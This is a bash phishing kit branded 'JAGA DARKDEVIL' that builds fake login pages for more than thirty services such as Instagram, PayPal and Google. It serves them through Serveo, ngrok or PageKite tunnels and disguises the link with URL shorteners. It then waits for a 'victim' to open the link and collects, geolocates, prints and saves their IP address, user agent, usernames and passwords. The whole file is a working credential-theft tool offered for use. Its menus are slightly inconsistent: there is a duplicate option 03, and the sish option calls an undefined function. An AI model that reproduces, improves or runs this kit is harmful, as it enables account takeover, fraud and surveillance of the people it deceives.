#!/bin/bash

trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}

menu() {

printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\e[1;94m \n"                                
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m eBay   \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;91m Pinterest   \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;91m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;91m CryptoCurrency   \e[0m\n"                
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;91m Github\e[0m         \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;91m Verizon   \e[0m\n"                
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;91m Google\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;91m DropBox   \e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;91m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;91m Adobe ID   \e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;91m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;91m Shopify   \e[0m  \n"        
printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;91m PayPal\e[0m         \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;91m Messenger   \e[0m \n"         
printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;91m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;91m GitLab   \e[0m    \n"
printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;91m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;91m Twitch   \e[0m     \n"
printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;91m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;91m MySpace   \e[0m    \n"
printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;91m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;91m Badoo   \e[0m      \n"
printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;91m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;91m VK   \e[0m         \n"
printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;91m Yandex   \e[0m     \n"
printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m devianART   \e[0m \n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option


if (( $option == 1 || $option == 01 )); then
server="instagram"
start1

elif [[ $option == 2 || $option == 02 ]]; then
server="facebook"
start1
elif [[ $option == 3 || $option == 03 ]]; then
server="snapchat"
start1
elif [[ $option == 4 || $option == 04 ]]; then
server="twitter"
start1
elif [[ $option == 5 || $option == 05 ]]; then
server="github"
start1
elif [[ $option == 6 || $option == 06 ]]; then
server="google"
start1

elif [[ $option == 7 || $option == 07 ]]; then
server="spotify"
start1

elif [[ $option == 8 || $option == 08 ]]; then
server="netflix"
start1

elif [[ $option == 9 || $option == 09 ]]; then
server="paypal"
start1

elif [[ $option == 10 ]]; then
server="origin"
start1

elif [[ $option == 11 ]]; then
server="steam"
start1

elif [[ $option == 12 ]]; then
server="yahoo"
start1

elif [[ $option == 13 ]]; then
server="linkedin"
start1

elif [[ $option == 14 ]]; then
server="protonmail"
start1

elif [[ $option == 15 ]]; then
server="wordpress"
start1

elif [[ $option == 16 ]]; then
server="microsoft"
start1

elif [[ $option == 17 ]]; then
server="instafollowers"
start1

elif [[ $option == 18 ]]; then
server="shopping"
start1

elif [[ $option == 19 ]]; then
server="pinterest"
start1

elif [[ $option == 20 ]]; then
server="cryptocurrency"
start1

elif [[ $option == 21 ]]; then
server="verizon"
start1

elif [[ $option == 22 ]]; then
server="dropbox"
start1

elif [[ $option == 23 ]]; then
server="adobe"
start1

elif [[ $option == 24 ]]; then
server="shopify"
start1

elif [[ $option == 25 ]]; then
server="messenger"
start1

elif [[ $option == 26 ]]; then
server="gitlab"
start1

elif [[ $option == 27 ]]; then
server="twitch"
start1

elif [[ $option == 28 ]]; then
server="myspace"
start1

elif [[ $option == 29 ]]; then
server="badoo"
start1

elif [[ $option == 30 ]]; then
server="vk"
start1

elif [[ $option == 31 ]]; then
server="yandex"
start1

elif [[ $option == 32 ]]; then
server="devianart"
start1

elif [[ $option == 33 ]]; then
server="create"
createpage
start1

elif [[ $option == 99 ]]; then
exit 1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi



}

banner() {

printf "\n"
printf "\e[1;93m       .:.:.:.\e[0m\e[1;77m JAGA DARKDEVIL \e[0m\e[1;93m.:.:.:.\e[0m\n"
printf "\n"
}

createpage() {
default_cap1="Wi-fi Session Expired"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
exit 1

}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}


##
# Serveo tunnel
serverx() {
    printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
    cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
    sleep 2

    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }

    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi

    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net > sendlink 2>/dev/null &
    sleep 10

    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    if [ -z "$send_link" ]; then
        echo "Error: Serveo link not generated."
        exit 1
    fi

    printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link

    # Try TinyURL API first
    send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=${send_link}")
    if [ -z "$send_ip" ] || [[ "$send_ip" == *"Error"* ]]; then
        echo "TinyURL failed, switching to is.gd..."
        send_ip=$(curl -s "https://is.gd/create.php?format=simple&url=${send_link}")
        if [ -z "$send_ip" ]; then
            echo "Error: Failed to shorten URL using both TinyURL and is.gd."
            exit 1
        fi
    fi

    printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Shortened link:\e[0m\e[1;77m %s \n' $send_ip
    printf "\n"
    checkfound
}


startx() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi

default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
serverx

}


##

# start() {
# if [[ -e sites/$server/ip.txt ]]; then
# rm -rf sites/$server/ip.txt

# fi
# if [[ -e sites/$server/usernames.txt ]]; then
# rm -rf sites/$server/usernames.txt

# fi


# if [[ -e ngrok ]]; then
# echo ""
# else
# command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
# command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
# printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
# arch=$(uname -a | grep -o 'arm' | head -n1)
# arch2=$(uname -a | grep -o 'Android' | head -n1)
# if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
# wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

# if [[ -e ngrok-stable-linux-arm.zip ]]; then
# unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
# chmod +x ngrok
# rm -rf ngrok-stable-linux-arm.zip
# else
# printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
# exit 1
# fi



# else
# wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
# if [[ -e ngrok-stable-linux-386.zip ]]; then
# unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
# chmod +x ngrok
# rm -rf ngrok-stable-linux-386.zip
# else
# printf "\e[1;93m[!] Download error... \e[0m\n"
# exit 1
# fi
# fi
# fi

# printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
# cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
# sleep 2
# printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
# ./ngrok http 3333 > /dev/null 2>&1 &
# sleep 10

# link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
# printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
# # send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
# send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=${link}" | head -n1)
# printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
# printf "\n"

# checkfound
# }

##
# ngrok tunnel
start() {
    if [[ -e sites/$server/ip.txt ]]; then
        rm -rf sites/$server/ip.txt
    fi
    if [[ -e sites/$server/usernames.txt ]]; then
        rm -rf sites/$server/usernames.txt
    fi

    if [[ -e ngrok ]]; then
        echo ""
    else
        command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
        command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
        printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
        arch=$(uname -a | grep -o 'arm' | head -n1)
        arch2=$(uname -a | grep -o 'Android' | head -n1)
        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
            if [[ -e ngrok-stable-linux-arm.zip ]]; then
                unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-arm.zip
            else
                printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
                exit 1
            fi
        else
            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
            if [[ -e ngrok-stable-linux-386.zip ]]; then
                unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-386.zip
            else
                printf "\e[1;93m[!] Download error... \e[0m\n"
                exit 1
            fi
        fi
    fi

    printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
    cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 10

    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    if [ -z "$link" ]; then
        echo "Error: Ngrok link not generated."
        exit 1
    fi

    printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link

    # Try TinyURL API first
    send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=${link}")
    if [ -z "$send_ip" ] || [[ "$send_ip" == *"Error"* ]]; then
        echo "TinyURL failed, switching to is.gd..."
        send_ip=$(curl -s "https://is.gd/create.php?format=simple&url=${link}")
        if [ -z "$send_ip" ]; then
            echo "Error: Failed to shorten URL using both TinyURL and is.gd."
            exit 1
        fi
    fi

    printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
    printf "\n"

    checkfound
}
    
##
# Pagekite tunnel
pkstart() {
    # Check if PageKite is installed
    if ! command -v pagekite >/dev/null 2>&1; then
        echo "Error: Pagekite is not installed."
        echo "Please install Pagekite from https://pagekite.net/ or via your package manager."
        echo "Try: sudo apt install pagekite."
        exit 1
    fi

    # Clean previous IP and credentials files
    if [[ -e sites/$server/ip.txt ]]; then rm -rf sites/$server/ip.txt; fi
    if [[ -e sites/$server/usernames.txt ]]; then rm -rf sites/$server/usernames.txt; fi

    # Prompt for a PageKite subdomain (without .pagekite.me)
    read -p $'\e[1;92m[*] Enter your PageKite subdomain (Default: pagekite): \e[0m' pk_sub
    pk_sub="${pk_sub:-pagekite}"

    default_port="3333"
    printf '\e[1;92m[*] Choose a Port (Default: %s): \e[0m' "$default_port"
    read port
    port="${port:-${default_port}}"

    # Start the PHP server in the target site folder
    printf "\e[1;92m[*] Starting php server on port %s...\n" "$port"
    cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
    sleep 2

    # Start the PageKite tunnel; ensure that PageKite is installed and in PATH.
    printf "\e[1;92m[*] Starting PageKite tunnel...\n"
    if [[ -e pagekite.log ]]; then rm -rf pagekite.log; fi
    pagekite 80 ${pk_sub}.pagekite.me > pagekite.log 2>&1 &
    sleep 15

    # Extract the public URL from pagekite.log using an updated regex
    pk_link=$(grep -Eo 'https?://[^ "'\''\n]*pagekite\.me' pagekite.log | head -n1)
    if [ -z "$pk_link" ]; then
        echo "Error: PageKite tunnel not generated. Here is the log output:"
        cat pagekite.log
        exit 1
    fi

    printf "\n\e[1;93m[*] Send the direct link to target: %s \n" "$pk_link"

    # Shorten the URL using TinyURL (fallback to is.gd)
    send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=${pk_link}" | head -n1)
    if [ -z "$send_ip" ] || [[ "$send_ip" == *"Error"* ]]; then
        echo "TinyURL failed, switching to is.gd..."
        send_ip=$(curl -s "https://is.gd/create.php?format=simple&url=${pk_link}" | head -n1)
        if [ -z "$send_ip" ]; then
            echo "Error: Failed to shorten URL using both TinyURL and is.gd."
            exit 1
        fi
    fi

    printf '\n\e[1;93m[*] Shortened link: %s \n' "$send_ip"
    printf "\n"
    checkfound
}


start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi


printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunelling, Best!)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m PageKite\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m sish\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Packetriot\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m localhost.run\e[0m\n"

default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
startx

elif [[ $option_server == 2 || $option_server == 02 ]]; then
start

elif [[ $option_server == 3 || $option_server == 03 ]]; then
pkstart

elif [[ $option_server == 4 || $option_server == 04 ]]; then
sishstart

elif [[ $option_server == 5 || $option_server == 05 ]]; then
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Packetriot is not supported yet.\e[0m\n"
    sleep 1
    clear
    start1

elif [[ $option_server == 6 || $option_server == 06 ]]; then
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] localhost.run is not supported yet.\e[0m\n"
    sleep 1
    clear
    start1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}
checkfound() {

printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.5
if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred
rm -rf sites/$server/usernames.txt
fi
sleep 0.5
done 

}
banner
dependencies
menu

